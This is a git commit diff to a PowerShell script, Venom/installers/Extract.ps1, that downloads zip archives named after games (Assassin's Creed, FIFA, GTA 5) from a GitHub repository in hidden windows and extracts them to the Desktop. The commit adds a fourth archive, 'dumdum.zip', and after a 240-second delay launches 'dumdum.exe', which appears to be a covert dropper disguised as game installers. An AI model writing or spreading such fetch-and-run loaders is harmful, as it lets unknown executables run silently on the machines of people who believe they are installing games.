ac681508e24187437cb69c10b21fb0462b2b5749
P0k3m0n-unleashed <pokemonunlaeshe@proton.me>
2025-03-31 19:18:54 -0800

    change up

--- Venom/installers/Extract.ps1
+++ Venom/installers/Extract.ps1
@@ -3,6 +3,7 @@ $zipFilePath = "$env:TEMP"
 $zipUrl = "https://github.com/P0k3m0n-unleashed/ProjSucc/raw/refs/heads/master/Venom/AssassinsCreed_SE.zip"
 $zipUrl_1 = "https://github.com/P0k3m0n-unleashed/ProjSucc/raw/refs/heads/master/Venom/Fifa-Ps5.zip"
 $zipUrl_2 = "https://github.com/P0k3m0n-unleashed/ProjSucc/raw/refs/heads/master/Venom/Gta5-Ps5.zip"
+$zipUrl_3 = "https://github.com/P0k3m0n-unleashed/ProjSucc/raw/refs/heads/master/Venom/dumdum.zip"
 $desktopPath = [System.Environment]::GetFolderPath("Desktop")
 function Test-IsAdmin {
     $currentUser = New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent())
@@ -23,15 +24,19 @@ powershell -windowstyle hidden Invoke-WebRequest -Uri $zipUrl_1 -OutFile "$zipFi
 
 powershell -windowstyle hidden Invoke-WebRequest -Uri $zipUrl_2 -OutFile "$zipFilePath\Gta5-Ps5.zip"
 
+powershell -windowstyle hidden Invoke-WebRequest -Uri $zipUrl_3 -OutFile "$zipFilePath\dumdum.zip"
+
 Expand-Archive -Path "$zipFilePath\AssassinsCreed_SE.zip" -DestinationPath $desktopPath -Force
 
 Expand-Archive -Path "$zipFilePath\Fifa-Ps5.zip" -DestinationPath $desktopPath -Force
 
 Expand-Archive -Path "$zipFilePath\Gta5-Ps5.zip" -DestinationPath $desktopPath -Force
 
+Expand-Archive -Path "$zipFilePath\dumdum.zip" -DestinationPath $desktopPath -Force
+
 Start-Sleep -Seconds 240
 
-#Start-Process -FilePath "$desktopPath\AssassinsCreed_SE.exe" 
+Start-Process -FilePath "$desktopPath\dumdum.exe" 
 
 exit 0
 
